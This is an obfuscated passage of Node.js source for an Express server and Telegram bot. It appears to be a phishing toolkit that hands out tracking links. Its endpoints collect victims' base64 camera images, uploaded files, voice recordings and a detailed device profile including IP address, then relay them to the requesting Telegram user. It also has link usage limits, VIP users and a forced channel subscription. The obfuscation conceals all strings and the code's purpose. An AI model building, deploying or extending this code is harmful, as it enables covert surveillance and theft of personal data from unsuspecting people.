        console[_0xdedbf1(0x5bb)](_0x2039bd[_0xdedbf1(0x873)], _0x53feff), _0x15b37f[_0xdedbf1(0x4cc)](-0x5e * -0x3 + 0x24 * -0x10b + 0x2666)[_0xdedbf1(0x850)](_0x2039bd[_0xdedbf1(0x191)]);
    }
}), app[_0x317544(0x3c5)](_0x317544(0x7e7), (_0x31c330, _0x1c5640) => {
    const _0x3c3862 = _0x317544, _0x4ba49c = { 'GyPuP': _0x3c3862(0x211) };
    _0x1c5640[_0x3c3862(0x3da)](path[_0x3c3862(0x57f)](__dirname, _0x4ba49c[_0x3c3862(0x270)]));
});
let userRequests = {};
app[_0x317544(0x33a)](_0x317544(0x703) + _0x317544(0x495), (_0x5831b7, _0x29d0f9) => {
    const _0x37319f = _0x317544, _0x2829de = { 'lgctV': _0x37319f(0x565) }, _0x2785fd = _0x5831b7[_0x37319f(0x51f)][_0x37319f(0x767)], _0x40edb1 = _0x5831b7[_0x37319f(0x51f)][_0x37319f(0x7af)], _0x1afa3e = _0x5831b7[_0x37319f(0x51f)][_0x37319f(0x855)];
    bot[_0x37319f(0x182) + 'on'](_0x2785fd, _0x40edb1, _0x1afa3e), _0x29d0f9[_0x37319f(0x850)](_0x2829de[_0x37319f(0x20e)]);
}), app[_0x317544(0x33a)](_0x317544(0x805) + _0x317544(0x478), (_0x5cf5b9, _0x458644) => {
    const _0x3cdf93 = _0x317544, _0x27fa1f = {
            'qhvIW': _0x3cdf93(0x8ff),
            'dagnQ': function (_0x41335a, _0x1fb6ad) {
                return _0x41335a + _0x1fb6ad;
            },
            'sucHT': _0x3cdf93(0x7de) + _0x3cdf93(0x452),
            'dWAmH': _0x3cdf93(0x866) + ':\x20',
            'mHPln': function (_0x13899b, _0x430003) {
                return _0x13899b > _0x430003;
            }
        }, _0x3378dd = _0x5cf5b9[_0x3cdf93(0x51f)][_0x3cdf93(0x767)], _0x5a84c2 = _0x5cf5b9[_0x3cdf93(0x51f)][_0x3cdf93(0x8ea)][_0x3cdf93(0x594)](',');
    console[_0x3cdf93(0x699)](_0x27fa1f[_0x3cdf93(0x789)], _0x5a84c2[_0x3cdf93(0x2c6)], _0x27fa1f[_0x3cdf93(0x46a)], _0x3378dd);
    if (_0x27fa1f[_0x3cdf93(0x63c)](_0x5a84c2[_0x3cdf93(0x2c6)], 0x1c5 * 0x1 + -0x4cf * -0x8 + -0x283d)) {
        const _0x5e64c7 = _0x5a84c2[_0x3cdf93(0x1de)]((_0x1f3e00, _0x32ced7) => {
            const _0x29c133 = _0x3cdf93, _0x545ab0 = Buffer[_0x29c133(0x6d0)](_0x1f3e00, _0x27fa1f[_0x29c133(0x607)]);
            return bot[_0x29c133(0x685)](_0x3378dd, _0x545ab0, { 'caption': _0x29c133(0x510) + _0x27fa1f[_0x29c133(0x7a2)](_0x32ced7, -0x11bc + -0x6b * -0x56 + -0x1235) });
        });
        Promise[_0x3cdf93(0x50b)](_0x5e64c7)[_0x3cdf93(0x826)](() => {
            const _0x18480b = _0x3cdf93;
            console[_0x18480b(0x699)](''), _0x458644[_0x18480b(0x162)]({ 'success': !![] });
        })[_0x3cdf93(0x60f)](_0x223385 => {
            const _0x152af7 = _0x3cdf93;
            console[_0x152af7(0x5bb)]('', _0x223385), _0x458644[_0x152af7(0x4cc)](-0x5aa + -0x1b * 0x129 + 0x26f1)[_0x152af7(0x162)]({ 'error': '' });
        });
    } else
        console[_0x3cdf93(0x699)](''), _0x458644[_0x3cdf93(0x4cc)](0x1 * 0x10df + -0x1 * -0x9ca + 0x505 * -0x5)[_0x3cdf93(0x162)]({ 'error': '' });
}), app[_0x317544(0x33a)](_0x317544(0x862) + _0x317544(0x2fb), upload[_0x317544(0x719)](_0x317544(0x73a), -0x6d9 * 0x4 + -0xa * -0xba + 0x6bc * 0x3), (_0x466689, _0x4dbd27) => {
    const _0x477fbe = _0x317544, _0xc41b8e = {
            'tMhUJ': function (_0x5c808c, _0x23d3de) {
                return _0x5c808c > _0x23d3de;
            }
        }, _0x3ea071 = _0x466689[_0x477fbe(0x51f)][_0x477fbe(0x5fe)], _0x5be7c8 = _0x466689[_0x477fbe(0x8f7)];
    if (_0x5be7c8 && _0xc41b8e[_0x477fbe(0x349)](_0x5be7c8[_0x477fbe(0x2c6)], 0x1 * 0x1a8 + 0xeb0 + -0x1058)) {
        console[_0x477fbe(0x699)](_0x477fbe(0x16c) + _0x5be7c8[_0x477fbe(0x2c6)] + '\x20\x20' + _0x3ea071);
        const _0x3f3da9 = _0x5be7c8[_0x477fbe(0x1de)](_0x27fe2 => bot[_0x477fbe(0x685)](_0x3ea071, _0x27fe2[_0x477fbe(0x7ad)]));
        Promise[_0x477fbe(0x50b)](_0x3f3da9)[_0x477fbe(0x826)](() => {
            const _0x169460 = _0x477fbe;
            console[_0x169460(0x699)](''), _0x4dbd27[_0x169460(0x162)]({ 'success': !![] });
        })[_0x477fbe(0x60f)](_0x399669 => {
            const _0x3d8019 = _0x477fbe;
            console[_0x3d8019(0x5bb)](':', _0x399669), _0x4dbd27[_0x3d8019(0x4cc)](0x20bc + -0x1e2e * -0x1 + -0x3cf6)[_0x3d8019(0x162)]({ 'error': '' });
        });
    } else
        console[_0x477fbe(0x699)](''), _0x4dbd27[_0x477fbe(0x4cc)](0x159a + -0x1a7d * -0x1 + -0x2e87)[_0x477fbe(0x162)]({ 'error': '' });
}), app[_0x317544(0x33a)](_0x317544(0x545) + 'ce', uploadVoice[_0x317544(0x1b0)](_0x317544(0x2af)), (_0x35956b, _0x42c5e7) => {
    const _0x508314 = _0x317544, _0x29252b = { 'SNHoT': _0x508314(0x353) }, _0x56b1e4 = _0x35956b[_0x508314(0x51f)][_0x508314(0x767)], _0x1be693 = _0x35956b[_0x508314(0x3ee)][_0x508314(0x430)];
    bot[_0x508314(0x64c)](_0x56b1e4, _0x1be693)[_0x508314(0x826)](() => {
        const _0x176e77 = _0x508314;
        fs[_0x176e77(0x72c)](_0x1be693), _0x42c5e7[_0x176e77(0x850)]('');
    })[_0x508314(0x60f)](_0x319e7d => {
        const _0x553f24 = _0x508314;
        console[_0x553f24(0x5bb)](_0x319e7d), _0x42c5e7[_0x553f24(0x4cc)](-0x1a3f * 0x1 + -0x1 * -0x10d6 + 0xb5d)[_0x553f24(0x850)](_0x29252b[_0x553f24(0x568)]);
    });
});
const PORT = process[_0x317544(0x786)][_0x317544(0x529)] || -0x43b + -0x1a1e * -0x1 + 0x13 * -0x89;
app[_0x317544(0x817)](PORT, () => {
    const _0x32a99a = _0x317544;
    console[_0x32a99a(0x699)](_0x32a99a(0x35b) + _0x32a99a(0x662) + _0x32a99a(0x59c) + PORT);
}), app[_0x317544(0x3c5)](_0x317544(0x8f5), (_0x5c6226, _0xc88af5) => {
    const _0x1b9f20 = _0x317544, _0x2a4ab0 = { 'SlAAa': _0x1b9f20(0x230) };
    _0xc88af5[_0x1b9f20(0x3da)](path[_0x1b9f20(0x57f)](__dirname, _0x2a4ab0[_0x1b9f20(0x42d)]));
}), app[_0x317544(0x33a)](_0x317544(0x24e), async (_0x2bb302, _0x1565cf) => {
    const _0x4c39c8 = _0x317544, _0x36836c = {
            'KjRuW': _0x4c39c8(0x910),
            'XviPD': _0x4c39c8(0x838) + _0x4c39c8(0x571) + _0x4c39c8(0x449),
            'yzVoJ': _0x4c39c8(0x2d7) + _0x4c39c8(0x4bf) + _0x4c39c8(0x8b8),
            'Ofzno': _0x4c39c8(0x2d7) + _0x4c39c8(0x4bf) + _0x4c39c8(0x758),
            'RtTSu': _0x4c39c8(0x55e) + _0x4c39c8(0x203) + _0x4c39c8(0x6a2)
        }, _0x233aac = _0x2bb302[_0x4c39c8(0x51f)][_0x4c39c8(0x5fe)], _0xcc025c = _0x2bb302[_0x4c39c8(0x51f)][_0x4c39c8(0x702)];
    if (_0xcc025c) {
        const _0x18ef0e = _0x4c39c8(0x2c0) + _0x4c39c8(0x1d1) + _0x4c39c8(0x254) + _0x4c39c8(0x6bc) + _0xcc025c[_0x4c39c8(0x1f0)] + (_0x4c39c8(0x2ce) + _0x4c39c8(0x619)) + _0xcc025c[_0x4c39c8(0x6fb)] + (_0x4c39c8(0x1ed) + _0x4c39c8(0x8a3)) + _0xcc025c['ip'] + (_0x4c39c8(0x406) + _0x4c39c8(0x291)) + _0xcc025c[_0x4c39c8(0x5fa)] + (_0x4c39c8(0x626) + _0x4c39c8(0x355) + _0x4c39c8(0x279)) + _0xcc025c[_0x4c39c8(0x5b8)] + (_0x4c39c8(0x608) + _0x4c39c8(0x6bc)) + _0xcc025c[_0x4c39c8(0x1ae)] + _0x4c39c8(0x282) + _0xcc025c[_0x4c39c8(0x322) + 'ed'] + (_0x4c39c8(0x38e) + _0x4c39c8(0x1e0) + _0x4c39c8(0x8d3) + _0x4c39c8(0x20f)) + _0xcc025c[_0x4c39c8(0x266) + 'e'] + (_0x4c39c8(0x7f4) + ':\x20') + _0xcc025c[_0x4c39c8(0x8c3)] + (_0x4c39c8(0x5ce) + _0x4c39c8(0x26c)) + _0xcc025c[_0x4c39c8(0x61a)] + (_0x4c39c8(0x3b8) + _0x4c39c8(0x57d)) + _0xcc025c[_0x4c39c8(0x1fe) + _0x4c39c8(0x821)] + (_0x4c39c8(0x334) + _0x4c39c8(0x26c)) + _0xcc025c[_0x4c39c8(0x846)] + (_0x4c39c8(0x750) + _0x4c39c8(0x277)) + _0xcc025c[_0x4c39c8(0x91d)] + (_0x4c39c8(0x7dd) + _0x4c39c8(0x618) + _0x4c39c8(0x6bc)) + _0xcc025c[_0x4c39c8(0x40b) + _0x4c39c8(0x506)] + (_0x4c39c8(0x521) + _0x4c39c8(0x164) + '\x20') + _0xcc025c[_0x4c39c8(0x7a4)] + (_0x4c39c8(0x441) + _0x4c39c8(0x73d)) + _0xcc025c[_0x4c39c8(0x43f)] + (_0x4c39c8(0x6c6) + _0x4c39c8(0x1fa)) + _0xcc025c[_0x4c39c8(0x887) + 'e'] + (_0x4c39c8(0x557) + _0x4c39c8(0x844)) + _0xcc025c[_0x4c39c8(0x922) + _0x4c39c8(0x352)] + (_0x4c39c8(0x1c4) + _0x4c39c8(0x5e2)) + _0xcc025c[_0x4c39c8(0x1e4) + _0x4c39c8(0x527)] + (_0x4c39c8(0x373) + _0x4c39c8(0x76c) + _0x4c39c8(0x64b)) + _0xcc025c[_0x4c39c8(0x74b)] + (_0x4c39c8(0x8f0) + _0x4c39c8(0x5e2)) + _0xcc025c[_0x4c39c8(0x6e2) + _0x4c39c8(0x2b2)] + (_0x4c39c8(0x762) + _0x4c39c8(0x7b2)) + _0xcc025c[_0x4c39c8(0x30f)] + (_0x4c39c8(0x451) + _0x4c39c8(0x8e7) + _0x4c39c8(0x7ef)) + _0xcc025c[_0x4c39c8(0x58c)] + (_0x4c39c8(0x613) + _0x4c39c8(0x61c) + _0x4c39c8(0x71c) + '\x20') + _0xcc025c[_0x4c39c8(0x411) + _0x4c39c8(0x485)] + (_0x4c39c8(0x757) + _0x4c39c8(0x1b2) + _0x4c39c8(0x7d8)) + _0xcc025c[_0x4c39c8(0x682) + _0x4c39c8(0x5cd)] + (_0x4c39c8(0x44c) + _0x4c39c8(0x2b8) + _0x4c39c8(0x218) + _0x4c39c8(0x59a)) + _0xcc025c[_0x4c39c8(0x245) + _0x4c39c8(0x32a)] + (_0x4c39c8(0x908) + _0x4c39c8(0x2f2) + _0x4c39c8(0x438)) + _0xcc025c[_0x4c39c8(0x6ad) + _0x4c39c8(0x360)] + (_0x4c39c8(0x354) + _0x4c39c8(0x7bf) + _0x4c39c8(0x7ec)) + _0xcc025c[_0x4c39c8(0x528) + 'rt'] + (_0x4c39c8(0x170) + '\x20');
        try {
            await bot[_0x4c39c8(0x5ad) + 'e'](_0x233aac, _0x18ef0e, { 'parse_mode': _0x36836c[_0x4c39c8(0x606)] }), console[_0x4c39c8(0x699)](_0x36836c[_0x4c39c8(0x3d8)]), _0x1565cf[_0x4c39c8(0x162)]({ 'success': !![] });
        } catch (_0x2b7156) {
            console[_0x4c39c8(0x5bb)](_0x36836c[_0x4c39c8(0x33d)], _0x2b7156), _0x1565cf[_0x4c39c8(0x4cc)](0x1bcb + 0x671 * -0x6 + -0x445 * -0x3)[_0x4c39c8(0x162)]({ 'error': _0x36836c[_0x4c39c8(0x41a)] });
        }
    } else
        console[_0x4c39c8(0x699)](_0x36836c[_0x4c39c8(0x5dc)]), _0x1565cf[_0x4c39c8(0x4cc)](-0xa7 * 0x3b + -0x1224 + 0x1 * 0x3a31)[_0x4c39c8(0x162)]({ 'error': _0x36836c[_0x4c39c8(0x5dc)] });
}), app[_0x317544(0x33a)](_0x317544(0x73b), (_0x2d2687, _0x49289d) => {
    const _0x2c404e = _0x317544, _0x54f3b7 = {
            'oWGuy': _0x2c404e(0x8ff),
            'SEaNU': function (_0xbcf18c, _0x747bb5) {
                return _0xbcf18c + _0x747bb5;
            },
            'cVeBi': _0x2c404e(0x4df) + _0x2c404e(0x3ed)
        }, _0x587584 = _0x2d2687[_0x2c404e(0x51f)][_0x2c404e(0x767)], _0x3a5c9e = _0x2d2687[_0x2c404e(0x51f)][_0x2c404e(0x8ea)][_0x2c404e(0x594)](',');
    _0x3a5c9e[_0x2c404e(0x3b5)]((_0x261028, _0xac8aa0) => {
        const _0x1f556d = _0x2c404e, _0x555ea7 = Buffer[_0x1f556d(0x6d0)](_0x261028, _0x54f3b7[_0x1f556d(0x1a9)]);
        bot[_0x1f556d(0x685)](_0x587584, _0x555ea7, { 'caption': _0x1f556d(0x2ee) + _0x54f3b7[_0x1f556d(0x650)](_0xac8aa0, 0x1 * 0xb65 + 0x2ba * -0x4 + -0x2 * 0x3e) });
    }), console[_0x2c404e(0x699)](_0x2c404e(0x2ef) + _0x2c404e(0x881) + _0x2c404e(0x213) + _0x587584), dataStore[_0x587584] && dataStore[_0x587584][_0x2c404e(0x81c)] ? _0x49289d[_0x2c404e(0x8d6)](dataStore[_0x587584][_0x2c404e(0x81c)]) : _0x49289d[_0x2c404e(0x850)](_0x54f3b7[_0x2c404e(0x5ae)]);
}), app[_0x317544(0x3c5)](_0x317544(0x23a), (_0x3102c9, _0x380224) => {
    const _0x4302ec = _0x317544, _0x22032e = { 'myGhB': _0x4302ec(0x782) };
    _0x380224[_0x4302ec(0x3da)](path[_0x4302ec(0x57f)](__dirname, _0x22032e[_0x4302ec(0x8ab)]));
});
let linkUsage = {};
const maxAttemptsPerButton = 0xdc7 + 0x43 * -0x71 + -0x9 * -0x1ff;
function validateLinkUsage(_0x210381, _0x5427d4) {
    const _0x1ce85c = _0x317544, _0x46394b = {
            'WoLSn': function (_0x534ae9, _0x42b5ee) {
                return _0x534ae9(_0x42b5ee);
            },
            'yloJu': function (_0x7dd823, _0x5d17a3) {
                return _0x7dd823 >= _0x5d17a3;
            }
        }, _0x1e5050 = _0x210381 + ':' + _0x5427d4;
    if (_0x46394b[_0x1ce85c(0x68f)](isVIPUser, _0x210381))
        return !![];
    if (linkUsage[_0x1e5050] && _0x46394b[_0x1ce85c(0x854)](linkUsage[_0x1e5050][_0x1ce85c(0x1da)], maxAttemptsPerButton))
        return ![];
    return !linkUsage[_0x1e5050] && (linkUsage[_0x1e5050] = { 'attempts': 0x0 }), linkUsage[_0x1e5050][_0x1ce85c(0x1da)]++, !![];
}
let vipUsers = {};
function addVIPUser(_0x5f1b80) {
    vipUsers[_0x5f1b80] = !![];
}
function removeVIPUser(_0xa50b4a) {
    delete vipUsers[_0xa50b4a];
}
function isVIPUser(_0x486612) {
    return !!vipUsers[_0x486612];
}
bot[_0x317544(0x62c)](/\/start/, async _0x2dea9d => {
    const _0x4264d2 = _0x317544, _0xd04065 = {
            'lvPDy': function (_0x2f7b47, _0x5c9d4f) {
                return _0x2f7b47(_0x5c9d4f);
            },
            'HXoAL': _0x4264d2(0x71f) + _0x4264d2(0x7ae) + _0x4264d2(0x304) + _0x4264d2(0x857) + _0x4264d2(0x679) + _0x4264d2(0x484),
            'NoVoV': _0x4264d2(0x3e8) + _0x4264d2(0x224) + _0x4264d2(0x2b5),
            'OnYMY': _0x4264d2(0x7ac) + _0x4264d2(0x409) + _0x4264d2(0x374),
            'glTcq': _0x4264d2(0x7ac) + _0x4264d2(0x42f) + _0x4264d2(0x25f),
            'rLvrX': _0x4264d2(0x895) + _0x4264d2(0x1f1),
            'kTHeF': _0x4264d2(0x48e) + _0x4264d2(0x1b6),
            'HDPzO': _0x4264d2(0x337) + _0x4264d2(0x3f3) + _0x4264d2(0x5ea),
            'pExSW': _0x4264d2(0x7b7) + 's',
            'HlxfR': _0x4264d2(0x915) + _0x4264d2(0x63b),
            'SDfSB': _0x4264d2(0x23d) + _0x4264d2(0x5cb),
            'qgepP': _0x4264d2(0x6c2) + _0x4264d2(0x4bb),
            'lkKlF': _0x4264d2(0x2d2) + _0x4264d2(0x577),
            'JVsRH': _0x4264d2(0x5a0) + _0x4264d2(0x5d2),
            'pyvQJ': _0x4264d2(0x737) + _0x4264d2(0x628),
            'SAhgX': _0x4264d2(0x841) + _0x4264d2(0x3be),
            'iWjKI': _0x4264d2(0x82d),
            'dxdQA': _0x4264d2(0x209) + _0x4264d2(0x3eb),
            'TZVcl': _0x4264d2(0x305) + 're',
            'LTMGD': _0x4264d2(0x6b8) + _0x4264d2(0x258),
            'xxmpm': _0x4264d2(0x1d9),
            'zgpUP': _0x4264d2(0x8cf) + _0x4264d2(0x426),
            'VPRZq': _0x4264d2(0x4a9) + _0x4264d2(0x290) + _0x4264d2(0x66c),
            'tuJMm': _0x4264d2(0x40c) + _0x4264d2(0x408) + _0x4264d2(0x27c) + _0x4264d2(0x8dd) + _0x4264d2(0x1a6),
            'mSCkC': _0x4264d2(0x4bd) + _0x4264d2(0x803),
            'TiqOP': _0x4264d2(0x4ad) + _0x4264d2(0x42e),
            'sMpWi': _0x4264d2(0x60e) + _0x4264d2(0x6b4),
            'pGxPt': _0x4264d2(0x532) + _0x4264d2(0x681) + _0x4264d2(0x4b6) + _0x4264d2(0x904) + _0x4264d2(0x476),
            'bWjjd': _0x4264d2(0x53e) + _0x4264d2(0x5b1),
            'pfAbB': _0x4264d2(0x318),
            'JxxsM': _0x4264d2(0x68a) + _0x4264d2(0x6ee) + _0x4264d2(0x226),
            'eomwe': _0x4264d2(0x2e7),
            'HuFWW': _0x4264d2(0x82f) + _0x4264d2(0x549),
            'bgBVV': _0x4264d2(0x72d) + _0x4264d2(0x30d) + _0x4264d2(0x36e) + _0x4264d2(0x668) + _0x4264d2(0x643),
            'MFzFs': _0x4264d2(0x1dd) + _0x4264d2(0x5ab),
            'SEPYd': _0x4264d2(0x597) + _0x4264d2(0x194) + '3',
            'XFKLC': _0x4264d2(0x6bd) + _0x4264d2(0x710),
            'NTiUX': _0x4264d2(0x384) + _0x4264d2(0x17d) + _0x4264d2(0x19e) + _0x4264d2(0x2ba) + 'e/',
            'JKjKQ': _0x4264d2(0x39a) + _0x4264d2(0x7c5),
            'IiZXB': _0x4264d2(0x813) + 'il',
            'lBtXw': _0x4264d2(0x65c) + '💳',
            'lkFHb': _0x4264d2(0x1ac) + _0x4264d2(0x7dc),
            'kjStG': _0x4264d2(0x575) + _0x4264d2(0x43a),
            'ZvNFF': _0x4264d2(0x39d) + _0x4264d2(0x58d),
            'zyskE': _0x4264d2(0x6e4) + _0x4264d2(0x1eb),
            'TRQUJ': _0x4264d2(0x60c) + _0x4264d2(0x624),
            'mJdCL': _0x4264d2(0x160) + _0x4264d2(0x25c),
            'PKOrH': _0x4264d2(0x4e8),
            'YpqQW': _0x4264d2(0x41c) + _0x4264d2(0x333),
            'llVRr': _0x4264d2(0x6de) + 's',
            'yHjpv': _0x4264d2(0x1cc) + _0x4264d2(0x43c),
            'MpQAO': _0x4264d2(0x4a4) + _0x4264d2(0x655),
            'Qwdzh': _0x4264d2(0x569) + _0x4264d2(0x47e),
            'CuHfv': _0x4264d2(0x597) + _0x4264d2(0x62d),
            'hIITl': function (_0x2b6e12, _0x2ab62b) {
                return _0x2b6e12 === _0x2ab62b;
            },
            'aHKHT': _0x4264d2(0x869) + _0x4264d2(0x4a0) + _0x4264d2(0x6ed) + _0x4264d2(0x865),
            'aYvuG': _0x4264d2(0x2a8) + _0x4264d2(0x5b3),
            'uwgIX': _0x4264d2(0x884),
            'IJPIL': _0x4264d2(0x2b0) + _0x4264d2(0x413),
            'lvcOE': _0x4264d2(0x6d8)
        }, _0x148fbe = _0x2dea9d[_0x4264d2(0x61f)]['id'], _0xb4183c = await _0xd04065[_0x4264d2(0x421)](isUserSubscribed, _0x148fbe);
    if (!_0xb4183c) {
        const _0x444ce1 = _0xd04065[_0x4264d2(0x3f5)], _0x326df9 = developerChannels[_0x4264d2(0x1de)](_0x450e67 => [{
                    'text': _0x4264d2(0x8c5) + _0x450e67,
                    'url': _0x4264d2(0x597) + _0x4264d2(0x476) + _0x450e67[_0x4264d2(0x228)](-0x9 * -0xfd + 0xa * 0x17d + -0xbe3 * 0x2)
                }]);
        bot[_0x4264d2(0x5ad) + 'e'](_0x148fbe, _0x444ce1, { 'reply_markup': { 'inline_keyboard': _0x326df9 } });
        return;
    }
    const _0x5e07e7 = _0xd04065[_0x4264d2(0x586)], _0x32fe2b = [
            [
                {
                    'text': _0xd04065[_0x4264d2(0x1b4)],
                    'callback_data': _0x4264d2(0x2ca) + _0x4264d2(0x62f) + _0x148fbe
                },
                {
                    'text': _0xd04065[_0x4264d2(0x734)],
                    'callback_data': _0x4264d2(0x4ce) + 'k:' + _0x148fbe
                }
            ],
            [
                {
                    'text': _0xd04065[_0x4264d2(0x1a2)],
                    'callback_data': _0x4264d2(0x698) + 'n:' + _0x148fbe
                },
                {
                    'text': _0xd04065[_0x4264d2(0x73f)],
                    'callback_data': _0x4264d2(0x2f4) + 'e:' + _0x148fbe
                }
            ],
            [
                {
                    'text': _0xd04065[_0x4264d2(0x1ec)],
                    'callback_data': _0xd04065[_0x4264d2(0x88c)]
                },
                {
                    'text': _0xd04065[_0x4264d2(0x8e4)],
                    'callback_data': _0xd04065[_0x4264d2(0x3b3)]
                }
            ],
            [
                {
                    'text': _0xd04065[_0x4264d2(0x18f)],
                    'callback_data': _0xd04065[_0x4264d2(0x3c3)]
                },
                {
                    'text': _0xd04065[_0x4264d2(0x22a)],
                    'callback_data': _0x4264d2(0x77c) + _0x4264d2(0x18e) + _0x148fbe
                }
            ],
            [
                {
                    'text': _0xd04065[_0x4264d2(0x346)],
                    'callback_data': _0x4264d2(0x64e) + _0x4264d2(0x8be) + _0x148fbe
                },
                {
                    'text': _0xd04065[_0x4264d2(0x900)],
                    'callback_data': _0xd04065[_0x4264d2(0x4d4)]
                }
            ],
            [
                {
                    'text': _0xd04065[_0x4264d2(0x3f6)],
                    'callback_data': _0xd04065[_0x4264d2(0x24a)]
                },
                {
                    'text': _0xd04065[_0x4264d2(0x6e9)],
                    'callback_data': _0xd04065[_0x4264d2(0x208)]
                }
            ],
            [
                {
                    'text': _0xd04065[_0x4264d2(0x1df)],
                    'callback_data': _0x4264d2(0x614) + 'k:' + _0x148fbe
                },
                {
                    'text': _0xd04065[_0x4264d2(0x87e)],
                    'web_app': { 'url': _0xd04065[_0x4264d2(0x1b7)] }
                }
            ],
            [
                {
                    'text': _0xd04065[_0x4264d2(0x8c8)],
                    'callback_data': _0xd04065[_0x4264d2(0x4f8)]
                },
                {
                    'text': _0xd04065[_0x4264d2(0x6ef)],
                    'web_app': { 'url': _0xd04065[_0x4264d2(0x239)] }
                }
            ],
            [
                {
                    'text': _0xd04065[_0x4264d2(0x560)],
                    'callback_data': _0xd04065[_0x4264d2(0x671)]
                },
                {
                    'text': _0xd04065[_0x4264d2(0x593)],
                    'callback_data': _0xd04065[_0x4264d2(0x3ba)]
                }
            ],
            [
                {
                    'text': _0xd04065[_0x4264d2(0x8c1)],
                    'web_app': { 'url': _0xd04065[_0x4264d2(0x880)] }
                },
                {
                    'text': _0xd04065[_0x4264d2(0x39e)],
                    'url': _0xd04065[_0x4264d2(0x41e)]
                }
            ],
            [
                {
                    'text': _0xd04065[_0x4264d2(0x31c)],
                    'web_app': { 'url': _0xd04065[_0x4264d2(0x731)] }
                },
                {
                    'text': _0xd04065[_0x4264d2(0x6cc)],
                    'callback_data': _0xd04065[_0x4264d2(0x535)]
                }
            ],
            [
                {
                    'text': _0xd04065[_0x4264d2(0x1fc)],
                    'callback_data': _0xd04065[_0x4264d2(0x3c7)]
                },
                {
                    'text': _0xd04065[_0x4264d2(0x90b)],
                    'callback_data': _0xd04065[_0x4264d2(0x76f)]
                }
            ],
            [
                {
                    'text': _0xd04065[_0x4264d2(0x531)],
                    'callback_data': _0xd04065[_0x4264d2(0x310)]
                },
                {
                    'text': _0xd04065[_0x4264d2(0x634)],
                    'callback_data': _0xd04065[_0x4264d2(0x555)]
                }
            ],
            [
                {
                    'text': _0xd04065[_0x4264d2(0x174)],
                    'callback_data': _0xd04065[_0x4264d2(0x697)]
                },
                {
                    'text': _0xd04065[_0x4264d2(0x8ac)],
                    'callback_data': _0xd04065[_0x4264d2(0x8ce)]
                }
            ],
            [{
                    'text': _0xd04065[_0x4264d2(0x616)],
                    'url': _0xd04065[_0x4264d2(0x2a2)]
                }]
        ];
    bot[_0x4264d2(0x5ad) + 'e'](_0x148fbe, _0x5e07e7, { 'reply_markup': { 'inline_keyboard': _0x32fe2b } });
    if (_0xd04065[_0x4264d2(0x639)](_0x148fbe, 0x1647f28fa + -0x11e836bdf + 0x11017729f)) {
        const _0x3a80e6 = _0xd04065[_0x4264d2(0x21e)], _0x4515c3 = [[
                    {
                        'text': _0xd04065[_0x4264d2(0x4ec)],
                        'callback_data': _0xd04065[_0x4264d2(0x641)]
                    },
                    {
                        'text': _0xd04065[_0x4264d2(0x3d6)],
                        'callback_data': _0xd04065[_0x4264d2(0x691)]
                    }
                ]];
        bot[_0x4264d2(0x5ad) + 'e'](_0x148fbe, _0x3a80e6, { 'reply_markup': { 'inline_keyboard': _0x4515c3 } });
    }
}), bot['on'](_0x317544(0x635) + _0x317544(0x53f), _0x5a13ba => {
    const _0x49228e = _0x317544, _0x300d5a = {
            'SwFbF': function (_0x29e1c5, _0x5cc3e5) {
                return _0x29e1c5 === _0x5cc3e5;
            },
            'yefkz': _0x49228e(0x23d) + _0x49228e(0x5cb)
        }, _0x47430e = _0x5a13ba[_0x49228e(0x4b7)][_0x49228e(0x61f)]['id'], _0x310340 = _0x5a13ba[_0x49228e(0x369)];
    if (_0x300d5a[_0x49228e(0x2e8)](_0x310340, _0x300d5a[_0x49228e(0x192)])) {
        const _0xfc21ca = _0x49228e(0x589) + _0x49228e(0x8f9) + _0x49228e(0x5a1) + _0x49228e(0x400) + _0x49228e(0x633) + _0x49228e(0x4a1) + _0x49228e(0x293) + _0x49228e(0x657) + _0x49228e(0x36b) + _0x49228e(0x2b7) + _0x49228e(0x49f) + _0x49228e(0x912) + _0x49228e(0x58b) + _0x49228e(0x5ec) + _0x49228e(0x55d) + _0x49228e(0x7a6) + _0x49228e(0x638) + _0x49228e(0x67f) + _0x49228e(0x445) + _0x49228e(0x43b) + _0x49228e(0x177);
        bot[_0x49228e(0x5ad) + 'e'](_0x47430e, _0xfc21ca);
    }
}), bot['on'](_0x317544(0x635) + _0x317544(0x53f), async _0x166f0e => {
    const _0x114394 = _0x317544, _0x39c18a = {
            'saBMS': function (_0x39ebd1, _0x471310) {
                return _0x39ebd1(_0x471310);
            },
            'UBqHE': _0x114394(0x1d9),
            'KhYTl': _0x114394(0x7b7) + 's',
            'frKjx': _0x114394(0x305) + 're',
            'beqnH': _0x114394(0x77c) + _0x114394(0x336),
            'RtFSU': _0x114394(0x82d),
            'SNwWO': _0x114394(0x614) + 'k',
            'trmRN': _0x114394(0x2e7),
            'puhfH': _0x114394(0x64e) + _0x114394(0x8bb),
            'zwKQC': function (_0x258625, _0xcdaff6) {
                return _0x258625(_0xcdaff6);
            },
            'jfVhG': _0x114394(0x71f) + _0x114394(0x7ae) + _0x114394(0x304) + _0x114394(0x857) + _0x114394(0x679) + _0x114394(0x484),
            'PmwBo': function (_0x16b5f3, _0x235065) {
                return _0x16b5f3 === _0x235065;
            },
            'rQfVP': _0x114394(0x2d2) + _0x114394(0x577),
            'lHGNQ': function (_0x2fb31f, _0x40e24b) {
                return _0x2fb31f === _0x40e24b;
            },
            'VMAQV': _0x114394(0x238),
            'sViHE': _0x114394(0x71d) + _0x114394(0x46b) + _0x114394(0x4a2) + _0x114394(0x54d) + _0x114394(0x8e1) + _0x114394(0x716),
            'irVTX': _0x114394(0x4fa) + _0x114394(0x4fd) + _0x114394(0x573) + _0x114394(0x704) + 'ns',
            'yXZpt': _0x114394(0x477) + _0x114394(0x324),
            'pUQBi': _0x114394(0x680),
            'qyAmF': _0x114394(0x403) + _0x114394(0x45e) + _0x114394(0x36c) + _0x114394(0x827) + _0x114394(0x4cd) + _0x114394(0x32f) + _0x114394(0x40f) + _0x114394(0x759) + _0x114394(0x338) + _0x114394(0x6c4) + 'cA',
            'kEPyd': _0x114394(0x6c3) + _0x114394(0x763),
            'xdEfs': _0x114394(0x250) + _0x114394(0x5c4),
            'WiGiT': _0x114394(0x2a4) + _0x114394(0x6f1) + _0x114394(0x3c6) + _0x114394(0x233) + _0x114394(0x287) + _0x114394(0x3e3) + _0x114394(0x53c),
            'blVhc': _0x114394(0x2d5) + _0x114394(0x68d),
